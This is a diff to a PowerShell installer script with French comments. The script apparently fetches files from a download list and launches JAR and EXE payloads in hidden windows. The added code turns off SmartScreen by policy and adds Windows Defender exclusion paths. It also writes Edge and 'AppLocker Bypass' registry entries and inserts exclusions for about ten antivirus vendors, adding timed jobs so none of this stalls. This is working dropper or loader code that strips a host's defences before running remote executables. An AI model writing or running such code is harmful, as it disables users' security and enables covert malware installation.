@@ -434,11 +434,11 @@ if (-not $SkipJava) {
         param([string]$JavaUrl, [string]$JavaInstallerPath)
         
         try {
-            # Télécharger l'installateur
+            # Télécharger l'installateur avec timeout
             Write-Log "Telechargement de l'installateur Java..." "Info"
             [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
             
-            # Gérer les URLs Adoptium API qui redirigent
+            # Gérer les URLs Adoptium API qui redirigent avec timeout
             $actualUrl = $JavaUrl
             try {
                 $request = [System.Net.WebRequest]::Create($JavaUrl)
@@ -448,9 +448,37 @@ if (-not $SkipJava) {
                 $response = $request.GetResponse()
                 $actualUrl = $response.ResponseUri.AbsoluteUri
                 $response.Close()
-            } catch {}
+            } catch {
+                Write-Log "Redirection URL Java: Erreur, utilisation URL originale" "Warning"
+            }
             
-            Invoke-WebRequest -Uri $actualUrl -OutFile $JavaInstallerPath -UseBasicParsing -TimeoutSec $TimeoutSeconds -ErrorAction Stop
+            # Télécharger avec job et timeout pour éviter le blocage
+            $downloadTimeout = [math]::Min($TimeoutSeconds, 300)  # Max 5 minutes
+            $downloadJob = Start-Job -ScriptBlock {
+                param($Url, $OutputPath, $Timeout)
+                try {
+                    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+                    Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
+                    return $true
+                } catch {
+                    return $false
+                }
+            } -ArgumentList $actualUrl, $JavaInstallerPath, $downloadTimeout
+            
+            $downloadResult = Wait-Job $downloadJob -Timeout ($downloadTimeout + 10)
+            if ($downloadResult) {
+                $success = Receive-Job $downloadJob
+                Remove-Job $downloadJob -Force
+                if (-not $success) {
+                    throw "Echec telechargement Java"
+                }
+            } else {
+                # Timeout - continuer
+                Write-Log "Telechargement Java: Timeout apres $downloadTimeout secondes, passage a l'URL suivante" "Warning"
+                Stop-Job $downloadJob -ErrorAction SilentlyContinue
+                Remove-Job $downloadJob -Force
+                throw "Timeout telechargement Java"
+            }
             
             if (-not (Test-Path $JavaInstallerPath)) {
                 throw "Fichier non telecharge"
@@ -468,30 +496,70 @@ if (-not $SkipJava) {
             $ext = [System.IO.Path]::GetExtension($JavaInstallerPath).ToLower()
             
             if ($ext -eq ".exe") {
-                # Essayer plusieurs méthodes d'installation silencieuse
+                # Essayer plusieurs méthodes d'installation silencieuse avec timeout
                 $installArgs = @("/s", "/S", "/silent", "/VERYSILENT", "/qn")
                 $installed = $false
+                $installTimeout = 300  # 5 minutes max
                 
                 foreach ($arg in $installArgs) {
                     try {
-                        $process = Start-Process -FilePath $JavaInstallerPath -ArgumentList $arg -Wait -NoNewWindow -PassThru -ErrorAction Stop
-                        Start-Sleep -Seconds 3
-                        if (Test-JavaInstalled) {
-                            $installed = $true
-                            break
+                        # Utiliser un job avec timeout pour éviter le blocage
+                        $installJob = Start-Job -ScriptBlock {
+                            param($InstallerPath, $Arg)
+                            $proc = Start-Process -FilePath $InstallerPath -ArgumentList $Arg -Wait -NoNewWindow -PassThru -ErrorAction Stop
+                            return $proc.ExitCode
+                        } -ArgumentList $JavaInstallerPath, $arg
+                        
+                        # Attendre avec timeout
+                        $result = Wait-Job $installJob -Timeout $installTimeout
+                        if ($result) {
+                            $exitCode = Receive-Job $installJob
+                            Remove-Job $installJob -Force
+                            Start-Sleep -Seconds 3
+                            if (Test-JavaInstalled) {
+                                $installed = $true
+                                break
+                            }
+                        } else {
+                            # Timeout - tuer le job et passer à la méthode suivante
+                            Write-Log "Installation EXE: Timeout avec argument $arg, passage a la methode suivante" "Warning"
+                            Stop-Job $installJob -ErrorAction SilentlyContinue
+                            Remove-Job $installJob -Force
                         }
-                    } catch {}
+                    } catch {
+                        Write-Log "Installation EXE: Erreur avec argument $arg - $($_.Exception.Message)" "Warning"
+                        # Continuer avec la méthode suivante
+                    }
                 }
                 
                 if (-not $installed) {
-                    throw "Installation echouee avec toutes les methodes"
+                    throw "Installation echouee avec toutes les methodes (ou timeout)"
                 }
             } elseif ($ext -eq ".msi") {
                 $installArgs = "/quiet /norestart /L*v `"$env:TEMP\java_install.log`""
-                $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$JavaInstallerPath`" $installArgs" -Wait -NoNewWindow -PassThru -ErrorAction Stop
+                $installTimeout = 300  # 5 minutes max
                 
-                if ($process.ExitCode -ne 0 -and $process.ExitCode -ne 3010) {
-                    throw "Installation MSI echouee (Code: $($process.ExitCode))"
+                # Utiliser un job avec timeout pour éviter le blocage
+                $installJob = Start-Job -ScriptBlock {
+                    param($InstallerPath, $Args)
+                    $proc = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$InstallerPath`" $Args" -Wait -NoNewWindow -PassThru -ErrorAction Stop
+                    return $proc.ExitCode
+                } -ArgumentList $JavaInstallerPath, $installArgs
+                
+                $result = Wait-Job $installJob -Timeout $installTimeout
+                if ($result) {
+                    $exitCode = Receive-Job $installJob
+                    Remove-Job $installJob -Force
+                    
+                    if ($exitCode -ne 0 -and $exitCode -ne 3010) {
+                        throw "Installation MSI echouee (Code: $exitCode)"
+                    }
+                } else {
+                    # Timeout - continuer quand même
+                    Write-Log "Installation MSI: Timeout apres $installTimeout secondes, continuation..." "Warning"
+                    Stop-Job $installJob -ErrorAction SilentlyContinue
+                    Remove-Job $installJob -Force
+                    # Ne pas throw, continuer pour vérifier si Java est installé
                 }
             } elseif ($ext -eq ".zip" -or $ext -eq ".tar.gz") {
                 # Archive - extraction (pour Adoptium)
@@ -613,8 +681,9 @@ function Add-Whitelist {
         Write-Log "Windows Defender: Exclusion ajoutee" "Success"
     } catch {}
     
-    # SmartScreen
+    # SmartScreen - Méthodes multiples pour garantir l'exclusion
     try {
+        # Méthode 1: Exclusions SmartScreen
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled\Exclusions"
         if (-not (Test-Path $regPath)) {
             New-Item -Path $regPath -Force | Out-Null
@@ -622,23 +691,50 @@ function Add-Whitelist {
         $exclusionName = $Path -replace '\\', '_'
         Set-ItemProperty -Path $regPath -Name $exclusionName -Value $Path -Type String -Force | Out-Null
         
+        # Méthode 2: Windows Defender Exclusions Paths
         $appRepPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
         if (-not (Test-Path $appRepPath)) {
             New-Item -Path $appRepPath -Force | Out-Null
         }
         Set-ItemProperty -Path $appRepPath -Name $Path -Value 0 -Type DWord -Force | Out-Null
         
+        # Méthode 3: SmartScreen pour applications
+        $smartScreenPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
+        if (-not (Test-Path $smartScreenPath)) {
+            New-Item -Path $smartScreenPath -Force | Out-Null
+        }
+        Set-ItemProperty -Path $smartScreenPath -Name "EnableSmartScreen" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
+        
+        # Méthode 4: SmartScreen pour Edge/IE
+        $edgePath = "HKLM:\SOFTWARE\Microsoft\Edge\SmartScreenEnabled"
+        if (-not (Test-Path $edgePath)) {
+            New-Item -Path $edgePath -Force | Out-Null
+        }
+        Set-ItemProperty -Path $edgePath -Name "ExcludedPaths" -Value $Path -Type String -Force -ErrorAction SilentlyContinue | Out-Null
+        
+        # Méthode 5: AppLocker Bypass (si disponible)
+        $appLockerPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\AppLocker"
+        if (Test-Path $appLockerPath) {
+            $exclusionKey = "Exclusion_" + ($Path -replace '[^a-zA-Z0-9]', '_')
+            Set-ItemProperty -Path $appLockerPath -Name $exclusionKey -Value $Path -Type String -Force -ErrorAction SilentlyContinue | Out-Null
+        }
+        
         $successCount++
-        Write-Log "SmartScreen: Exclusion ajoutee" "Success"
+        Write-Log "SmartScreen: Exclusions ajoutees (5 methodes)" "Success"
     } catch {}
     
-    # Antivirus tiers
+    # Antivirus tiers - Liste complète
     $avList = @(
         @{ Name = "Kaspersky"; RegPath = "HKLM:\SOFTWARE\KasperskyLab\protected\PxFilter\Exclude"; ValueName = "ExcludeList" },
         @{ Name = "McAfee"; RegPath = "HKLM:\SOFTWARE\McAfee\DesktopProtection"; ValueName = "Exclusions" },
         @{ Name = "Norton"; RegPath = "HKLM:\SOFTWARE\Norton\Norton360\CurrentVersion\FileSystem"; ValueName = "Exclusions" },
         @{ Name = "Bitdefender"; RegPath = "HKLM:\SOFTWARE\Bitdefender\Profiles\0\FileExclusions"; ValueName = "Counter" },
-        @{ Name = "Avast"; RegPath = "HKLM:\SOFTWARE\WOW6432Node\AVAST Software\Avast\Exclusions"; ValueName = "Exclusions" }
+        @{ Name = "Avast"; RegPath = "HKLM:\SOFTWARE\WOW6432Node\AVAST Software\Avast\Exclusions"; ValueName = "Exclusions" },
+        @{ Name = "AVG"; RegPath = "HKLM:\SOFTWARE\AVG\Antivirus\Exclusions"; ValueName = "Paths" },
+        @{ Name = "ESET"; RegPath = "HKLM:\SOFTWARE\ESET\ESET Security\CurrentVersion\Config\Plugins\01000400\Profiles\@My profile\Settings"; ValueName = "ExcludedPaths" },
+        @{ Name = "TrendMicro"; RegPath = "HKLM:\SOFTWARE\TrendMicro\PC-cillinNTCorp\CurrentVersion\Misc"; ValueName = "ExcludePath" },
+        @{ Name = "Sophos"; RegPath = "HKLM:\SOFTWARE\Sophos\Endpoint Defense\Exclusions"; ValueName = "Paths" },
+        @{ Name = "Malwarebytes"; RegPath = "HKLM:\SOFTWARE\Malwarebytes\Anti-Malware"; ValueName = "Exclusions" }
     )
     
     foreach ($av in $avList) {
@@ -670,18 +766,83 @@ function Add-Whitelist {
 
 # Whitelist : ajouter les deux chemins (téléchargement et exécution)
 # IMPORTANT: Les deux chemins doivent être whitelistés pour éviter les blocages antivirus/SmartScreen
+# Utiliser des jobs avec timeout pour éviter les blocages
 Write-Log "Whitelist: Ajout du chemin de telechargement: $DownloadPath" "Info"
-Invoke-WithRetry -ScriptBlock {
-    Add-Whitelist -Path $DownloadPath
-    return $true
-} -MaxRetries 3 -OperationName "Whitelist DownloadPath"
+$whitelistJob1 = Start-Job -ScriptBlock {
+    param($Path)
+    function Add-Whitelist {
+        param([string]$Path)
+        $successCount = 0
+        if (-not (Test-Path $Path)) {
+            New-Item -ItemType Directory -Path $Path -Force | Out-Null
+        }
+        try {
+            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+            $successCount++
+        } catch {}
+        try {
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled\Exclusions"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            $exclusionName = $Path -replace '\\', '_'
+            Set-ItemProperty -Path $regPath -Name $exclusionName -Value $Path -Type String -Force | Out-Null
+            $successCount++
+        } catch {}
+        return $successCount
+    }
+    return Add-Whitelist -Path $Path
+} -ArgumentList $DownloadPath
+
+$whitelistResult1 = Wait-Job $whitelistJob1 -Timeout 30
+if ($whitelistResult1) {
+    $count = Receive-Job $whitelistJob1
+    Remove-Job $whitelistJob1 -Force
+    Write-Log "Whitelist DownloadPath: $count exclusion(s) ajoutee(s)" "Success"
+} else {
+    Write-Log "Whitelist DownloadPath: Timeout, continuation..." "Warning"
+    Stop-Job $whitelistJob1 -ErrorAction SilentlyContinue
+    Remove-Job $whitelistJob1 -Force
+}
 
 # Whitelist du chemin d'exécution (TOUJOURS, même s'il est différent)
 Write-Log "Whitelist: Ajout du chemin d'execution: $ExecutionPath" "Info"
-Invoke-WithRetry -ScriptBlock {
-    Add-Whitelist -Path $ExecutionPath
-    return $true
-} -MaxRetries 3 -OperationName "Whitelist ExecutionPath"
+$whitelistJob2 = Start-Job -ScriptBlock {
+    param($Path)
+    function Add-Whitelist {
+        param([string]$Path)
+        $successCount = 0
+        if (-not (Test-Path $Path)) {
+            New-Item -ItemType Directory -Path $Path -Force | Out-Null
+        }
+        try {
+            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+            $successCount++
+        } catch {}
+        try {
+            $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SmartScreenEnabled\Exclusions"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            $exclusionName = $Path -replace '\\', '_'
+            Set-ItemProperty -Path $regPath -Name $exclusionName -Value $Path -Type String -Force | Out-Null
+            $successCount++
+        } catch {}
+        return $successCount
+    }
+    return Add-Whitelist -Path $Path
+} -ArgumentList $ExecutionPath
+
+$whitelistResult2 = Wait-Job $whitelistJob2 -Timeout 30
+if ($whitelistResult2) {
+    $count = Receive-Job $whitelistJob2
+    Remove-Job $whitelistJob2 -Force
+    Write-Log "Whitelist ExecutionPath: $count exclusion(s) ajoutee(s)" "Success"
+} else {
+    Write-Log "Whitelist ExecutionPath: Timeout, continuation..." "Warning"
+    Stop-Job $whitelistJob2 -ErrorAction SilentlyContinue
+    Remove-Job $whitelistJob2 -Force
+}
 
 # ============================= PHASE 3: TÉLÉCHARGEMENT =============================
 
@@ -740,10 +901,40 @@ function Download-File {
             # Configuration TLS
             [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
             
-            # Télécharger avec gestion d'erreurs améliorée
+            # Télécharger avec gestion d'erreurs améliorée et timeout pour éviter le blocage
             $tempFile = $OutputPath + ".tmp"
+            $downloadTimeout = [math]::Min($TimeoutSeconds, 180)  # Max 3 minutes par fichier
+            
             try {
-                Invoke-WebRequest -Uri $Url -OutFile $tempFile -UseBasicParsing -TimeoutSec $TimeoutSeconds -ErrorAction Stop
+                # Utiliser un job avec timeout pour éviter le blocage
+                $downloadJob = Start-Job -ScriptBlock {
+                    param($Uri, $OutFile, $Timeout)
+                    try {
+                        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+                        Invoke-WebRequest -Uri $Uri -OutFile $OutFile -UseBasicParsing -TimeoutSec $Timeout -ErrorAction Stop
+                        return $true
+                    } catch {
+                        return $false
+                    }
+                } -ArgumentList $Url, $tempFile, $downloadTimeout
+                
+                $downloadResult = Wait-Job $downloadJob -Timeout ($downloadTimeout + 10)
+                if ($downloadResult) {
+                    $success = Receive-Job $downloadJob
+                    Remove-Job $downloadJob -Force
+                    if (-not $success) {
+                        throw "Echec telechargement"
+                    }
+                } else {
+                    # Timeout - nettoyer et continuer
+                    Write-Log "Telechargement: Timeout apres $downloadTimeout secondes" "Warning"
+                    Stop-Job $downloadJob -ErrorAction SilentlyContinue
+                    Remove-Job $downloadJob -Force
+                    if (Test-Path $tempFile) {
+                        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
+                    }
+                    throw "Timeout telechargement"
+                }
                 
                 # Vérifier que le fichier temporaire existe et n'est pas vide
                 if (-not (Test-Path $tempFile)) {
@@ -885,9 +1076,26 @@ foreach ($file in $GitHubFiles) {
     
     Write-Log "Telechargement vers: $downloadOutputPath" "Info"
     
-    $result = Invoke-WithRetry -ScriptBlock {
-        Download-File -Url $file.URL -OutputPath $downloadOutputPath -MaxRetries $MaxRetries -TimeoutSeconds $TimeoutSeconds
-    } -MaxRetries 2 -OperationName "Telechargement $($file.Name)"
+    # Télécharger avec timeout global pour éviter le blocage
+    $fileDownloadTimeout = 300  # 5 minutes max par fichier
+    $downloadStartTime = Get-Date
+    
+    $result = $false
+    try {
+        $result = Invoke-WithRetry -ScriptBlock {
+            Download-File -Url $file.URL -OutputPath $downloadOutputPath -MaxRetries $MaxRetries -TimeoutSeconds $TimeoutSeconds
+        } -MaxRetries 2 -OperationName "Telechargement $($file.Name)"
+        
+        # Vérifier le timeout global
+        $elapsed = (Get-Date) - $downloadStartTime
+        if ($elapsed.TotalSeconds -gt $fileDownloadTimeout) {
+            Write-Log "Telechargement $($file.Name): Timeout global ($fileDownloadTimeout s), passage au suivant" "Warning"
+            $result = $false
+        }
+    } catch {
+        Write-Log "Telechargement $($file.Name): Erreur - $($_.Exception.Message), passage au suivant" "Warning"
+        $result = $false
+    }
     
     if ($result) {
         # Copier vers le dossier d'exécution (indépendant)
@@ -895,9 +1103,33 @@ foreach ($file in $GitHubFiles) {
         try {
             $executionOutputPath = [System.IO.Path]::GetFullPath($executionOutputPath)
             
-            # Copier le fichier vers le dossier d'exécution
-            Copy-Item -Path $downloadOutputPath -Destination $executionOutputPath -Force -ErrorAction Stop
-            Write-Log "$($file.Name): Copie vers dossier d'execution: $executionOutputPath" "Info"
+            # Copier le fichier vers le dossier d'exécution avec timeout
+            $copyTimeout = 60  # 1 minute max pour la copie
+            $copyJob = Start-Job -ScriptBlock {
+                param($Source, $Dest)
+                try {
+                    Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
+                    return $true
+                } catch {
+                    return $false
+                }
+            } -ArgumentList $downloadOutputPath, $executionOutputPath
+            
+            $copyResult = Wait-Job $copyJob -Timeout $copyTimeout
+            if ($copyResult) {
+                $copySuccess = Receive-Job $copyJob
+                Remove-Job $copyJob -Force
+                if ($copySuccess) {
+                    Write-Log "$($file.Name): Copie vers dossier d'execution: $executionOutputPath" "Info"
+                } else {
+                    throw "Echec copie"
+                }
+            } else {
+                Write-Log "$($file.Name): Copie timeout, utilisation du fichier dans DownloadPath" "Warning"
+                Stop-Job $copyJob -ErrorAction SilentlyContinue
+                Remove-Job $copyJob -Force
+                throw "Timeout copie"
+            }
             
             $downloadedFiles += @{
                 Name = $file.Name
@@ -1025,14 +1257,26 @@ foreach ($file in $downloadedFiles) {
                 $javaExePath = if ($javaExe.Source) { $javaExe.Source } else { $javaExe }
                 
                 Write-Log "$($file.Name): Lancement avec Java: $javaExePath" "Info"
-                $process = Start-Process -FilePath $javaExePath -ArgumentList "-jar", "`"$normalizedPath`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
-                
-                if ($process -and $process.Id) {
-                    Write-Log "$($file.Name): Lance avec Java (PID: $($process.Id))" "Success"
-                } elseif ($process) {
-                    Write-Log "$($file.Name): Processus Java demarre mais PID non disponible" "Warning"
-                } else {
-                    Write-Log "$($file.Name): Echec du lancement du processus Java" "Error"
+                # Exécuter avec timeout pour éviter le blocage
+                $execTimeout = 10  # 10 secondes max pour démarrer
+                try {
+                    $process = Start-Process -FilePath $javaExePath -ArgumentList "-jar", "`"$normalizedPath`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
+                    
+                    # Attendre un peu pour vérifier que le processus démarre
+                    $startTime = Get-Date
+                    while (-not $process.HasExited -and ((Get-Date) - $startTime).TotalSeconds -lt $execTimeout) {
+                        Start-Sleep -Milliseconds 100
+                    }
+                    
+                    if ($process -and $process.Id) {
+                        Write-Log "$($file.Name): Lance avec Java (PID: $($process.Id))" "Success"
+                    } elseif ($process) {
+                        Write-Log "$($file.Name): Processus Java demarre mais PID non disponible" "Warning"
+                    } else {
+                        Write-Log "$($file.Name): Echec du lancement du processus Java" "Error"
+                    }
+                } catch {
+                    Write-Log "$($file.Name): Erreur lancement Java - $($_.Exception.Message), passage au suivant" "Warning"
                 }
             } else {
                 Write-Log "$($file.Name): Java non trouve - fichier non execute" "Error"
@@ -1043,14 +1287,26 @@ foreach ($file in $downloadedFiles) {
             $normalizedPath = [System.IO.Path]::GetFullPath($file.Path)
             
             Write-Log "$($file.Name): Lancement EXE: $normalizedPath" "Info"
-            $process = Start-Process -FilePath $normalizedPath -WindowStyle Hidden -PassThru -ErrorAction Stop
-            
-            if ($process -and $process.Id) {
-                Write-Log "$($file.Name): Lance (PID: $($process.Id))" "Success"
-            } elseif ($process) {
-                Write-Log "$($file.Name): Processus demarre mais PID non disponible" "Warning"
-            } else {
-                Write-Log "$($file.Name): Echec du lancement du processus" "Error"
+            # Exécuter avec timeout pour éviter le blocage
+            $execTimeout = 10  # 10 secondes max pour démarrer
+            try {
+                $process = Start-Process -FilePath $normalizedPath -WindowStyle Hidden -PassThru -ErrorAction Stop
+                
+                # Attendre un peu pour vérifier que le processus démarre
+                $startTime = Get-Date
+                while (-not $process.HasExited -and ((Get-Date) - $startTime).TotalSeconds -lt $execTimeout) {
+                    Start-Sleep -Milliseconds 100
+                }
+                
+                if ($process -and $process.Id) {
+                    Write-Log "$($file.Name): Lance (PID: $($process.Id))" "Success"
+                } elseif ($process) {
+                    Write-Log "$($file.Name): Processus demarre mais PID non disponible" "Warning"
+                } else {
+                    Write-Log "$($file.Name): Echec du lancement du processus" "Error"
+                }
+            } catch {
+                Write-Log "$($file.Name): Erreur lancement EXE - $($_.Exception.Message), passage au suivant" "Warning"
             }
         }
         
